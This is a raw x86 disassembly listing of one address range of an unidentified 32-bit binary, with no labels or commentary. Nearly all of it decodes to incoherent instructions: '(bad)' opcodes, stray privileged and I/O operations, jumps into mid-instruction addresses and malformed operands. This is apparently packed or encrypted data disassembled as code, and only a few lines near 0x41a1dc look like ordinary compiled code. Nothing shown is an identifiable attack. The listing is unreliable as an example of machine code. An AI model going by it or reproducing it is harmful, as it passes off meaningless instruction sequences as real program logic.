  419fb9:	aam    0x32
  419fbb:	sar    al,cl
  419fbd:	pop    edx
  419fbe:	bnd jb 0x41a01c
  419fc1:	stos   DWORD PTR es:[edi],eax
  419fc2:	popa   
  419fc3:	mov    esp,0xcc6da07a
  419fc8:	(bad)  
  419fc9:	scas   eax,DWORD PTR es:[edi]
  419fca:	ss mov eax,0x10661b4c
  419fd0:	les    ebp,FWORD PTR [edi-0x11]
  419fd3:	hlt    
  419fd4:	xor    edx,DWORD PTR [ebx-0x1d010a78]
  419fda:	loop   0x419f9d
  419fdc:	stc    
  419fdd:	dec    edx
  419fde:	outs   dx,BYTE PTR ds:[esi]
  419fdf:	push   eax
  419fe0:	test   DWORD PTR [edi-0x5e29fee5],edx
  419fe6:	punpcklwd mm7,DWORD PTR [ebx+ecx*8+0x1e77e429]
  419fee:	adc    BYTE PTR [edi*1+0x2e379360],dh
  419ff5:	test   BYTE PTR [edx-0x45],cl
  419ff8:	and    al,0x62
  419ffa:	push   ss
  419ffb:	test   eax,0x162e84af
  41a000:	pop    es
  41a001:	lods   eax,DWORD PTR ds:[esi]
  41a002:	ret    0x68b4
  41a005:	inc    esi
  41a006:	mov    ?,edx
  41a008:	pop    es
  41a009:	pop    ecx
  41a00a:	push   cs
  41a00b:	test   BYTE PTR [edx+0x26],ch
  41a00e:	sub    DWORD PTR [ebp-0x1f],ebx
  41a011:	jge    0x41a077
  41a013:	pop    es
  41a014:	mov    ebp,ebp
  41a016:	scas   al,BYTE PTR es:[edi]
  41a017:	jge    0x41a018
  41a019:	ss std 
  41a01b:	shl    DWORD PTR [eax],0x72
  41a01e:	or     DWORD PTR cs:[edx],esp
  41a021:	aas    
  41a022:	mov    ds:0xc7f3411d,al
  41a027:	pop    ds
  41a028:	mov    ecx,0x16e7f272
  41a02d:	bound  edx,QWORD PTR [ebp+0x4979d8cc]
  41a033:	push   esi
  41a034:	popa   
  41a035:	or     ebx,DWORD PTR [ebx]
  41a037:	in     eax,dx
  41a038:	test   eax,eax
  41a03a:	or     al,0xc3
  41a03c:	fld1   
  41a03e:	xchg   BYTE PTR [eax+0x1e],bl
  41a041:	stos   BYTE PTR es:[edi],al
  41a042:	cld    
  41a043:	lods   al,BYTE PTR ds:[esi]
  41a044:	sbb    eax,0x32f7e66d
  41a049:	xchg   esp,eax
  41a04a:	stos   DWORD PTR es:[edi],eax
  41a04b:	and    al,0x28
  41a04d:	mov    bh,0xbd
  41a04f:	cwde   
  41a050:	call   0x2e80f37f
  41a055:	xor    dl,dh
  41a057:	jg     0x419ffc
  41a059:	bound  edi,QWORD PTR [eax-0x54]
  41a05c:	rol    BYTE PTR [esi+0x60b2795],cl
  41a062:	or     ecx,edx
  41a064:	mov    ds:0x7465f3e0,eax
  41a069:	jl     0x41a054
  41a06b:	sti    
  41a06c:	fstp   QWORD PTR [ecx+0x1600b668]
  41a072:	push   eax
  41a073:	aad    0x8
  41a075:	xchg   esi,eax
  41a076:	cdq    
  41a077:	cmp    al,0xbc
  41a079:	add    dh,BYTE PTR [edx+ecx*2+0x7e]
  41a07d:	loop   0x41a0ad
  41a07f:	xchg   edi,eax
  41a080:	fwait
  41a081:	nop
  41a082:	sbb    eax,0x47edcfc1
  41a087:	stos   BYTE PTR es:[edi],al
  41a088:	(bad)  
  41a089:	pop    ebx
  41a08a:	inc    esp
  41a08b:	(bad)  
  41a08c:	xchg   ecx,eax
  41a08d:	and    eax,0xded899fe
  41a092:	mov    ah,0x52
  41a094:	dec    esi
  41a095:	ja     0x41a0f7
  41a097:	(bad)  
  41a098:	dec    esp
  41a099:	jp     0x41a06d
  41a09b:	repz lds ebp,FWORD PTR [edi-0x30]
  41a09f:	jno    0x41a0e7
  41a0a1:	inc    ebx
  41a0a2:	and    BYTE PTR [edx],0x8e
  41a0a5:	and    eax,0x97797bf
  41a0aa:	rol    DWORD PTR [ebx+0x5a25fada],0xae
  41a0b1:	adc    eax,0x92202e22
  41a0b6:	push   ds
  41a0b7:	xchg   edi,eax
  41a0b8:	outs   dx,DWORD PTR ds:[esi]
  41a0b9:	cmp    DWORD PTR [ebx+0x44],esi
  41a0bc:	or     bl,BYTE PTR [eax-0x6b]
  41a0bf:	cmp    eax,0xd7b52746
  41a0c4:	pusha  
  41a0c5:	mov    BYTE PTR [edi-0x4180e183],dh
  41a0cb:	mov    dl,0x7b
  41a0cd:	aas    
  41a0ce:	dec    esp
  41a0cf:	imul   ecx,esi,0xffffffff
  41a0d2:	das    
  41a0d3:	pop    eax
  41a0d4:	loope  0x41a08e
  41a0d6:	inc    edx
  41a0d7:	lahf   
  41a0d8:	adc    eax,0x59bbdd89
  41a0dd:	jmp    0x41a10c
  41a0df:	lahf   
  41a0e0:	sub    al,0x37
  41a0e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0e3:	adc    al,0xf5
  41a0e5:	jns    0x41a156
  41a0e7:	std    
  41a0e8:	in     al,0x8b
  41a0ea:	shl    esp,cl
  41a0ec:	bound  esp,QWORD PTR [ebp-0x384de365]
  41a0f2:	retf   
  41a0f3:	stos   DWORD PTR es:[edi],eax
  41a0f4:	iret   
  41a0f5:	adc    al,BYTE PTR [ebp-0x6963d938]
  41a0fb:	mov    cl,0x36
  41a0fd:	loopne 0x41a0ba
  41a0ff:	jmp    0xfbce3144
  41a104:	retf   0x51c1
  41a107:	leave  
  41a108:	xchg   edi,eax
  41a109:	push   ecx
  41a10a:	lahf   
  41a10b:	cmc    
  41a10c:	les    ebx,FWORD PTR [ecx-0x9]
  41a10f:	aad    0xcd
  41a111:	cmp    eax,0x16ff7e45
  41a116:	dec    edx
  41a117:	xor    al,0x3f
  41a119:	push   0x11445ad8
  41a11e:	inc    edx
  41a11f:	mov    ch,0x21
  41a121:	mov    al,ds:0x54c84739
  41a126:	or     eax,0xcd66d26f
  41a12b:	gs loope 0x41a17f
  41a12e:	stos   BYTE PTR es:[edi],al
  41a12f:	data16 jge 0x41a181
  41a132:	jl     0x41a133
  41a134:	retf   0x7427
  41a137:	xlat   BYTE PTR ds:[ebx]
  41a138:	cmp    DWORD PTR [eax+0x13],ebx
  41a13b:	lods   eax,DWORD PTR ds:[esi]
  41a13c:	jno    0x41a10b
  41a13e:	dec    eax
  41a13f:	mov    BYTE PTR [ecx-0x5a],al
  41a142:	(bad)  
  41a144:	sub    al,0x98
  41a146:	fld    st(6)
  41a148:	cdq    
  41a149:	icebp  
  41a14a:	loopne 0x41a14f
  41a14c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a14d:	inc    edx
  41a14e:	fld    DWORD PTR [esi+0x63]
  41a151:	aaa    
  41a152:	sar    WORD PTR [ebx+0x37],0x99
  41a157:	mov    esi,0x9e6d93c2
  41a15c:	fidivr WORD PTR [ebx]
  41a15e:	fiadd  WORD PTR [ecx-0x63b5cc7a]
  41a164:	xchg   DWORD PTR [ebx+0x5f],edx
  41a167:	adc    eax,0x98acd542
  41a16c:	xchg   edi,eax
  41a16d:	daa    
  41a16e:	pop    esi
  41a170:	xor    ah,dl
  41a172:	retw   0xa14f
  41a176:	hlt    
  41a177:	pop    eax
  41a178:	jb     0x41a180
  41a17a:	pop    ds
  41a17b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a17c:	cwde   
  41a17d:	xchg   ecx,eax
  41a17e:	push   esp
  41a17f:	push   ss
  41a180:	mov    ebp,gs
  41a182:	ds stos DWORD PTR es:[edi],eax
  41a184:	dec    ecx
  41a185:	into   
  41a186:	push   es
  41a187:	fsub   st(0),st
  41a189:	out    0xe2,al
  41a18b:	pop    esi
  41a18c:	arpl   WORD PTR [edi],dx
  41a18e:	(bad)  
  41a18f:	cdq    
  41a190:	push   edi
  41a191:	lahf   
  41a192:	pop    edi
  41a193:	mov    bh,0x67
  41a195:	push   edx
  41a196:	jbe    0x41a1e9
  41a198:	hlt    
  41a199:	mov    al,0xdd
  41a19b:	mov    esi,0x6acbfd29
  41a1a0:	hlt    
  41a1a1:	or     DWORD PTR gs:0xc2267e4a,0xf275d448
  41a1ac:	aas    
  41a1ad:	popw   ds
  41a1af:	shl    bh,cl
  41a1b1:	or     ecx,DWORD PTR [ebx-0x53]
  41a1b4:	fs and eax,0x88e31068
  41a1ba:	mov    ecx,0x22c21be6
  41a1bf:	loop   0x41a1cf
  41a1c1:	sub    al,bh
  41a1c3:	mov    BYTE PTR [ebx+ecx*1-0x40],bh
  41a1c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1c8:	push   esi
  41a1c9:	lea    ebp,[eax+0x70]
  41a1cc:	jle    0x41a1c0
  41a1ce:	mov    esp,0x7a0b0811
  41a1d3:	lods   eax,DWORD PTR ds:[esi]
  41a1d4:	or     DWORD PTR [ebx],esi
  41a1d6:	push   edx
  41a1d7:	mov    eax,ds:0xd13be452
  41a1dc:	mov    ecx,DWORD PTR [ebp-0xc]
  41a1df:	mov    DWORD PTR [ebp+0x8],ecx
  41a1e2:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1e5:	je     0x420e5d
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	dec    eax
  41a208:	inc    esp
  41a209:	rol    DWORD PTR [edi],1
  41a20b:	outs   dx,BYTE PTR ds:[esi]
  41a20c:	sbb    al,0x7d
  41a20e:	jp     0x41a21a
  41a210:	pop    edi
  41a211:	jp     0x41a28d
  41a213:	enter  0x58a5,0x2f
  41a217:	pusha  
  41a218:	lahf   
  41a219:	mov    ch,0xd
  41a21b:	push   esi
  41a21c:	stos   BYTE PTR es:[edi],al
  41a21d:	scas   eax,DWORD PTR es:[edi]
  41a21e:	jecxz  0x41a1c3
  41a220:	xchg   ebx,eax
  41a221:	cmp    BYTE PTR [esi-0x4529f904],dl
  41a227:	retf   
  41a228:	or     BYTE PTR [edi+0x63480300],0xe
  41a22f:	push   0xd32d07cc
  41a234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a235:	and    cl,BYTE PTR [edi+0x32]
  41a238:	pop    edx
  41a239:	and    al,0x22
  41a23b:	push   esp
  41a23c:	fwait
  41a23d:	and    BYTE PTR [esi+0x57be23df],bl
  41a243:	ds pop esp
  41a245:	pop    eax
  41a246:	sub    ebx,ebx
  41a248:	leave  
  41a249:	pop    ecx
  41a24a:	mov    ch,0x58
  41a24c:	std    
  41a24d:	sahf   
  41a24e:	jge    0x41a275
  41a250:	or     esp,0xd38ad4a3
  41a256:	in     al,0x57
  41a258:	les    edi,FWORD PTR [ebp+0x6da16fa5]
  41a25e:	in     eax,dx
  41a25f:	inc    edi
  41a260:	mov    WORD PTR [eax],?
  41a262:	fnstenv [esi-0x5502a99e]
  41a268:	pushf  
  41a269:	das    
  41a26a:	(bad)  
  41a26b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a26c:	jecxz  0x41a2e6
  41a26e:	das    
  41a26f:	ret    
  41a270:	mov    bh,0x84
  41a272:	jmp    0xe5db16b
  41a277:	dec    ecx
  41a278:	lahf   
  41a279:	jecxz  0x41a2d8
  41a27b:	push   ebx
  41a27c:	push   DWORD PTR [edx]
  41a27e:	dec    ebx
  41a27f:	cli    
  41a280:	test   eax,0x57a2278b
  41a285:	jle    0x41a271
  41a287:	ficomp DWORD PTR [edi]
  41a289:	add    bl,al
  41a28b:	(bad)  
  41a28c:	xor    ebx,DWORD PTR [ecx+0x23]
  41a28f:	cmp    al,0xb6
  41a291:	cmp    al,0x78
  41a293:	pop    edx
  41a294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a295:	add    DWORD PTR [ebx-0x317670a1],eax
  41a29b:	inc    edx
  41a29c:	pop    esi
  41a29d:	imul   esp,DWORD PTR [eax],0xc9c448f
  41a2a3:	sub    al,0xff
  41a2a5:	add    eax,0x51a3f82f
  41a2aa:	jae    0x41a22c
  41a2ac:	pop    ss
  41a2ad:	push   ds
  41a2ae:	(bad)  
  41a2af:	xchg   edx,eax
  41a2b0:	lods   eax,DWORD PTR ds:[esi]
  41a2b1:	les    edi,FWORD PTR ds:0x250bca35
  41a2b7:	jmp    0x41a2af
  41a2b9:	popa   
  41a2ba:	sub    eax,0x14f36e37
  41a2bf:	hlt    
  41a2c0:	outs   dx,DWORD PTR ds:[esi]
  41a2c1:	pop    es
  41a2c2:	mov    al,ds:0x24897785
  41a2c7:	leave  
  41a2c8:	push   ebx
  41a2c9:	xchg   edx,eax
  41a2ca:	inc    ecx
  41a2cb:	mov    cl,0xab
  41a2cd:	xchg   bh,ch
  41a2cf:	add    eax,0x54b8c7d1
  41a2d4:	daa    
  41a2d5:	js     0x41a312
  41a2d7:	aam    0x61
  41a2d9:	and    eax,0x61e0185d
  41a2de:	retf   0x8cc9
  41a2e1:	std    
  41a2e2:	sub    DWORD PTR [eax],ebx
  41a2e4:	jmp    0x824d:0xef061d07
  41a2eb:	adc    cl,BYTE PTR [edx-0x34484c15]
  41a2f1:	mov    bl,0xcb
  41a2f3:	cmp    DWORD PTR [ebp-0x38dc393d],ebp
  41a2f9:	jle    0x41a341
  41a2fb:	adc    bl,BYTE PTR [esi-0x2f22dcd0]
  41a301:	fistp  WORD PTR [ebx-0x404c4b03]
  41a307:	sbb    al,0x25
  41a309:	push   esi
  41a30a:	pushf  
  41a30b:	mov    ecx,0xefa220c8
  41a310:	xor    edi,DWORD PTR [esi-0x17315006]
  41a316:	ror    BYTE PTR [edi-0x5ee9ca82],1
  41a31c:	aas    
  41a31d:	das    
  41a31e:	dec    eax
  41a31f:	pop    DWORD PTR [edi+0x6058f729]
  41a325:	sbb    al,al
  41a327:	mov    eax,ds:0xb861d25b
  41a32c:	cmp    ebp,0xd5629102
  41a332:	stc    
  41a333:	icebp  
  41a334:	in     al,dx
  41a335:	sti    
  41a336:	data16 ffree st(0)
  41a339:	pop    ebp
  41a33a:	int3   
  41a33b:	imul   ecx,DWORD PTR [edi+0x39],0xffffff80
  41a33f:	cmp    BYTE PTR [ebp+0x3f6b1a32],0x79
  41a346:	sbb    dl,BYTE PTR [ebx]
  41a348:	(bad)  
  41a34a:	lods   al,BYTE PTR ds:[esi]
  41a34b:	in     al,0x5e
  41a34d:	mov    ebp,0x20247637
  41a352:	dec    esp
  41a353:	sti    
  41a354:	rol    BYTE PTR [ebx],0xe7
  41a357:	out    dx,eax
  41a358:	xor    BYTE PTR [eax-0x32fc0556],al
  41a35e:	push   ebx
  41a35f:	xchg   ebp,eax
  41a360:	retf   
  41a361:	in     al,0x1b
  41a363:	mov    dh,BYTE PTR [eax-0x53]
  41a366:	pop    ds
  41a367:	(bad)  
  41a368:	sub    DWORD PTR ds:0xb5540d4d,esp
  41a36e:	std    
  41a36f:	adc    al,0x79
  41a371:	mov    es:0x55f581af,eax
  41a377:	push   es
  41a378:	add    al,0x1b
  41a37a:	repnz leave 
  41a37c:	mov    ch,0x27
  41a37e:	frstor [edx+0x6]
  41a381:	cmp    BYTE PTR [ecx],cl
  41a383:	(bad)  [ecx]
  41a385:	cmp    eax,DWORD PTR [edi]
  41a387:	push   0xffffffc9
  41a389:	cdq    
  41a38a:	(bad)
  41a38f:	dec    edi
  41a390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a391:	adc    bh,0xe8
  41a394:	push   ebp
  41a395:	mov    ch,0xb4
  41a397:	cmp    ch,dh
  41a399:	mov    ecx,0x760c89c4
  41a39e:	lahf   
  41a39f:	lahf   
  41a3a0:	xor    ebp,DWORD PTR [ecx+esi*2]
  41a3a3:	mov    ebp,DWORD PTR [ecx]
  41a3a5:	push   edx
  41a3a6:	mov    al,ds:0x9db4c8d
  41a3ab:	push   0x70
  41a3ad:	jbe    0x41a3d1
  41a3af:	fcmove st,st(4)
  41a3b1:	test   al,0x3f
  41a3b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3b4:	addr16 xchg ebp,eax
  41a3b6:	pushf  
  41a3b7:	lock or al,0x54
  41a3ba:	(bad)  
  41a3bb:	dec    edi
  41a3bc:	sub    al,0x3f
  41a3be:	sub    esi,DWORD PTR [esi+0x13]
  41a3c1:	mov    ds:0xe7a923b4,eax
  41a3c6:	xchg   ecx,eax
  41a3c7:	cwde   
  41a3c8:	mov    esi,es
  41a3ca:	or     DWORD PTR [esi],esp
  41a3cc:	or     al,0x54
  41a3ce:	mov    esp,0xf28b44c2
  41a3d3:	xlat   BYTE PTR ds:[ebx]
  41a3d4:	int    0xe9
  41a3d6:	sub    dl,BYTE PTR [ebp+0x700f794c]
  41a3dc:	cwde   
  41a3dd:	lods   al,BYTE PTR ds:[esi]
  41a3de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3df:	leave  
  41a3e0:	pop    ss
  41a3e1:	push   cs
  41a3e2:	add    DWORD PTR [ebx],edi
  41a3e4:	or     edx,DWORD PTR [edi+0x451165f3]
  41a3ea:	iret   
  41a3eb:	cmp    edi,DWORD PTR [edx]
  41a3ed:	push   cs
  41a3ee:	jg     0x41a431
  41a3f0:	xchg   esp,eax
  41a3f1:	cmp    eax,DWORD PTR [eax-0xf]
  41a3f4:	mov    eax,0xb4d0ed78
  41a3f9:	sbb    esi,edi
  41a3fb:	xchg   edx,eax
  41a3fc:	retf   0xb2af
  41a3ff:	pop    edi
  41a400:	shl    DWORD PTR [edx+0x15],1
  41a403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a404:	ins    DWORD PTR es:[edi],dx
  41a405:	pushf  
  41a406:	lahf   
  41a407:	xchg   ebx,eax
  41a408:	inc    ecx
  41a409:	popa   
  41a40a:	lds    esp,FWORD PTR [eax]
  41a40c:	ds inc ebp
  41a40e:	out    0x35,al
  41a410:	test   DWORD PTR [ecx-0x4ee0fda],edi
  41a416:	sahf   
  41a417:	dec    ebp
  41a418:	fld    DWORD PTR [esi]
  41a41a:	sbb    ebp,ebx
  41a41c:	xchg   ecx,eax
  41a41d:	mov    ch,0x50
  41a41f:	sbb    ebx,DWORD PTR [ebp-0x19b8db77]
  41a425:	cld    
  41a426:	inc    edi
  41a427:	push   edx
  41a428:	shl    DWORD PTR [ecx+0x5b],cl
  41a42b:	pand   mm7,QWORD PTR [ecx]
  41a42e:	or     bl,0x9d
  41a431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a432:	in     eax,0x95
  41a434:	or     al,0xc6
  41a436:	aaa    
  41a437:	xchg   ebx,eax
  41a438:	(bad)  
  41a439:	mov    edx,DWORD PTR [edx-0x21]
  41a43c:	cmp    eax,0xf0fca687
  41a441:	add    dl,BYTE PTR [ecx]
  41a443:	outs   dx,BYTE PTR ds:[esi]
  41a444:	jo     0x41a3eb
  41a446:	das    
  41a447:	lahf   
  41a448:	js     0x41a46b
  41a44a:	inc    eax
  41a44b:	das    
  41a44c:	add    bl,al
  41a44e:	or     eax,DWORD PTR [edx-0x13]
  41a451:	and    cl,dh
  41a453:	sbb    BYTE PTR [edi],dh
  41a455:	mov    WORD PTR ds:0x955d,fs
  41a45a:	jp     0x41a41e
  41a45c:	push   esp
  41a45d:	neg    DWORD PTR [bp+0x8]
  41a461:	stos   BYTE PTR es:[edi],al
  41a462:	test   eax,0x31ee577c
  41a467:	sbb    ebp,DWORD PTR [esi]
  41a469:	mov    al,ds:0xb02a2ea4
  41a46e:	add    DWORD PTR [edx+0x7b4586ea],edx
  41a474:	push   cs
  41a475:	pop    ss
  41a476:	or     DWORD PTR ds:0x194b13f4,ebx
  41a47c:	int    0xa1
  41a47e:	pop    esp
  41a47f:	push   edx
  41a480:	inc    eax
  41a481:	inc    edi
  41a482:	mov    DWORD PTR [edx+0x3c0c2be2],esi
  41a488:	out    dx,eax
  41a489:	ds pop edi
  41a48b:	xor    esi,DWORD PTR [ecx-0x34]
  41a48e:	and    bh,al
  41a490:	icebp  
  41a491:	mov    bl,0xf
  41a493:	sub    al,BYTE PTR [ebp-0x28f266a3]
  41a499:	or     eax,0xc2c30cd1
  41a49e:	out    dx,al
  41a49f:	rol    BYTE PTR [eax+eiz*1-0xcbd63c3],cl
  41a4a6:	popa   
  41a4a7:	neg    ch
  41a4a9:	and    eax,0x97d59cb5
  41a4ae:	aas    
  41a4af:	outs   dx,DWORD PTR ds:[esi]
  41a4b0:	mov    bl,BYTE PTR [ecx+ebp*2]
  41a4b3:	xor    cl,ah
  41a4b5:	rcr    BYTE PTR [esi-0x3cec6e7e],cl
  41a4bb:	or     esi,DWORD PTR [edx+0x75c0240d]
  41a4c1:	mov    eax,ds:0x4a25671a
  41a4c6:	push   0xe461641
  41a4cb:	loope  0x41a456
  41a4cd:	enter  0x664b,0xe7
  41a4d1:	push   ss
  41a4d2:	or     edi,DWORD PTR [ebx+ecx*2]
  41a4d5:	stos   DWORD PTR es:[edi],eax
  41a4d6:	sbb    al,0xd2
  41a4d8:	sbb    al,0x40
  41a4da:	lahf   
  41a4db:	xor    cl,dl
  41a4dd:	jo     0x41a549
  41a4df:	push   ebp
  41a4e0:	cwde   
  41a4e1:	add    BYTE PTR [ebp-0x232cc650],ch
  41a4e7:	adc    edi,DWORD PTR [edi]
  41a4e9:	stos   DWORD PTR es:[edi],eax
  41a4ea:	mov    edi,0x6941f2f
  41a4ef:	lea    esi,[eax-0x5f]
  41a4f2:	dec    ah
  41a4f4:	xlat   BYTE PTR ds:[ebx]
  41a4f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4f6:	xor    bh,0xd1
  41a4f9:	fiadd  WORD PTR [edx]
  41a4fb:	push   ecx
  41a4fc:	pushf  
  41a4fd:	mov    dh,0x8
  41a4ff:	mov    DWORD PTR [ebp+0x40],eax
  41a502:	sbb    BYTE PTR [ecx-0x8],cl
  41a505:	jle    0x41a496
  41a507:	repz fisttp DWORD PTR [edi+0x3e]
  41a50b:	aas    
  41a50c:	sti    
  41a50d:	frstor [ebx-0x62]
  41a510:	shr    bl,1
  41a512:	in     eax,0x97
  41a514:	xor    DWORD PTR [ebp+0x31f3f60e],ecx
  41a51a:	dec    cx
  41a51c:	jb     0x41a4a2
  41a51e:	scas   eax,DWORD PTR es:[edi]
  41a51f:	or     al,0x98
  41a521:	ret    0x997a
  41a524:	adc    dh,BYTE PTR [ecx]
  41a526:	in     eax,0x62
  41a528:	mov    dh,0xf0
  41a52a:	jne    0x41a4f4
  41a52c:	pop    ds
  41a52d:	mov    dl,al
  41a52f:	push   ds
  41a530:	pop    ds
  41a531:	mov    ecx,0x6383b597
  41a536:	ja     0x41a4bd
  41a538:	fst    DWORD PTR ds:0xcecc4f04
  41a53e:	xchg   esp,eax
  41a53f:	(bad)  
  41a540:	out    dx,al
  41a541:	push   es
  41a542:	push   ds
  41a543:	inc    eax
  41a544:	pop    edx
  41a545:	sbb    al,0xcb
  41a547:	dec    edi
  41a548:	mov    eax,ds:0xb61797f9
  41a54d:	addr16 aas 
  41a54f:	(bad)  
  41a550:	cmp    eax,0xf51bbea5
  41a555:	push   ecx
  41a556:	sbb    esi,DWORD PTR [edx-0x27]
  41a559:	mov    BYTE PTR [esi+0x6ce8a9ca],bl
  41a55f:	sbb    eax,0x8a3c6019
  41a564:	sub    al,0xb1
  41a566:	test   DWORD PTR [edi-0x20facded],ebp
  41a56c:	popf   
  41a56d:	lods   al,BYTE PTR ds:[esi]
  41a56e:	in     al,0x25
  41a570:	pop    ss
  41a571:	mov    bl,0x10
  41a573:	icebp  
  41a574:	adc    ecx,DWORD PTR [ecx]
  41a576:	jns    0x41a5bb
  41a578:	out    0x9e,al
  41a57a:	enter  0xc589,0x6b
  41a57e:	sahf   
  41a57f:	aam    0x7f
  41a581:	in     eax,0x4e
  41a583:	aad    0x91
  41a585:	aad    0x5
  41a587:	cmp    al,0xbc
  41a589:	pop    ds
  41a58a:	adc    BYTE PTR [ebp+0x21],dl
  41a58d:	cmp    al,0xd8
  41a58f:	sbb    al,0x4d
  41a591:	sub    DWORD PTR [edx],ecx
  41a593:	scas   al,BYTE PTR es:[edi]
  41a594:	in     al,0x6e
  41a596:	(bad)  
  41a597:	dec    esp
  41a598:	dec    edi
  41a599:	das    
  41a59a:	cmp    BYTE PTR [edx+ecx*4-0x29],al
  41a59e:	mov    ecx,0x7a5db777
  41a5a3:	test   DWORD PTR [esi],edx
  41a5a5:	push   cs
  41a5a6:	cmp    edi,esp
  41a5a8:	push   edi
  41a5a9:	call   0xc3d7:0x5a1438c9
  41a5b0:	test   al,0x8f
  41a5b2:	cmc    
  41a5b3:	push   esi
  41a5b4:	sub    esp,DWORD PTR ds:0xf68b92d9
  41a5ba:	dec    eax
  41a5bb:	add    eax,0xeaf65920
  41a5c0:	jne    0x41a55c
  41a5c2:	jo     0x41a633
  41a5c4:	xchg   edi,eax
  41a5c5:	xchg   esp,eax
  41a5c6:	ja     0x41a5c6
  41a5c8:	in     eax,0x5a
  41a5ca:	es push ecx
  41a5cc:	out    0x97,al
  41a5ce:	or     ebx,DWORD PTR [ecx-0x9]
  41a5d1:	loope  0x41a58d
  41a5d3:	mov    BYTE PTR [edi],dh
  41a5d5:	mov    al,0x3
  41a5d7:	xchg   ecx,eax
  41a5d8:	push   0xffffff8e
  41a5da:	lahf   
  41a5db:	mov    cl,ah
  41a5dd:	mov    esi,0xc0ca5919
  41a5e2:	(bad)  
  41a5e3:	je     0x41a5cf
  41a5e5:	mov    bl,BYTE PTR [ecx+0x6c5df45e]
  41a5eb:	ret    
  41a5ec:	push   0xea02ab0c
  41a5f1:	in     al,0x68
  41a5f3:	ins    DWORD PTR es:[edi],dx
  41a5f4:	fild   DWORD PTR [eax+edi*8]
  41a5f7:	imul   edi,DWORD PTR [edi+0x1b],0xb9d31343
  41a5fe:	pop    ebp
  41a5ff:	add    DWORD PTR [ebx],edx
  41a601:	ins    DWORD PTR es:[edi],dx
  41a602:	mov    ah,0x5f
  41a604:	push   0xffffff96
  41a606:	jecxz  0x41a607
  41a608:	lock icebp 
  41a60a:	push   eax
  41a60b:	adc    al,0x54
  41a60d:	ficom  WORD PTR [esp+ebx*2]
  41a610:	jl     0x41a5bc
  41a612:	xchg   ecx,eax
  41a613:	(bad)  
  41a614:	shl    DWORD PTR [edi-0x55],cl
  41a617:	jl     0x41a607
  41a619:	xchg   BYTE PTR [edx],dh
  41a61b:	loopne 0x41a613
  41a61d:	cmp    dl,BYTE PTR [ebp+0x58ceef9b]
  41a623:	daa    
  41a624:	rcl    DWORD PTR [eax-0x3],1
  41a627:	test   BYTE PTR [edi-0x52468a17],ah
  41a62d:	outs   dx,DWORD PTR ds:[esi]
  41a62e:	enter  0x713d,0xde
  41a632:	dec    edi
  41a633:	shl    ah,cl
  41a635:	mov    ss,edx
  41a637:	aaa    
  41a638:	or     eax,DWORD PTR [edx+esi*4-0x6f]
  41a63c:	inc    esi
  41a63d:	and    DWORD PTR [edi+0x6b132012],ecx
  41a643:	sub    eax,0x2d8078c9
  41a648:	mov    esi,0x2d97cb8c
  41a64d:	mov    bh,0x5c
  41a64f:	jl     0x41a690
  41a651:	adc    DWORD PTR cs:[edx+0x10],edx
  41a655:	stos   DWORD PTR es:[edi],eax
  41a656:	aad    0x1d
  41a658:	popfw  
  41a65a:	xchg   BYTE PTR ds:0xa42c2e3b,ah
  41a660:	les    ecx,FWORD PTR [edx]
  41a662:	add    eax,esi
  41a664:	xor    edx,DWORD PTR [ecx]
  41a666:	mov    ch,0x6a
  41a668:	xor    BYTE PTR [ecx+0x19],al
  41a66b:	fs xchg dl,ah
  41a66e:	inc    esp
  41a66f:	sub    DWORD PTR [ebp-0x22341105],edi
  41a675:	jl     0x41a6b6
  41a677:	int3   
  41a678:	pop    eax
  41a679:	sbb    eax,0x731e3a5a
  41a67e:	add    DWORD PTR [ebx+0x27],ebx
  41a681:	rcr    BYTE PTR [ebp+0x1a],1
  41a684:	jae    0x41a6f6
  41a686:	jge    0x41a64a
  41a688:	mov    edi,0xacb279b0
  41a68d:	pop    ecx
  41a68e:	sub    al,0x84
  41a690:	ret    
  41a691:	out    dx,al
  41a692:	jne    0x41a6f5
  41a694:	pop    edx
  41a695:	adc    BYTE PTR [ecx+0x4f],bh
  41a698:	sbb    BYTE PTR [ebx-0x447f4f30],ah
  41a69e:	js     0x41a6c0
  41a6a0:	inc    ecx
  41a6a1:	adc    eax,0x235b5d4
  41a6a6:	fist   DWORD PTR [ebx-0x56afb5a]
  41a6ac:	jmp    0x667ecf62
  41a6b1:	inc    ebx
  41a6b2:	mov    ds:0x2b854f4b,al
  41a6b7:	call   0x7b46ab2a
  41a6bc:	dec    DWORD PTR [ecx]
  41a6be:	inc    BYTE PTR [eax+0x4f4c1b94]
  41a6c4:	jle    0x41a67c
  41a6c6:	lahf   
  41a6c7:	mov    edi,ss
  41a6c9:	es sub al,0x44
  41a6cc:	sub    bl,BYTE PTR [edi]
  41a6ce:	and    edi,DWORD PTR [edx+edx*2]
  41a6d1:	fadd   QWORD PTR [esi+esi*4-0x3243b715]
  41a6d8:	lods   al,BYTE PTR ds:[esi]
  41a6d9:	in     al,dx
  41a6da:	stc    
  41a6db:	sub    al,dl
  41a6dd:	scas   eax,DWORD PTR es:[edi]
  41a6de:	mov    ds:0x732766ff,al
  41a6e3:	je     0x41a6b1
  41a6e5:	ins    BYTE PTR es:[edi],dx
  41a6e6:	sub    eax,0x5b690a22
  41a6eb:	fsubr  DWORD PTR [edi+0x12]
  41a6ee:	or     eax,0x910ee953
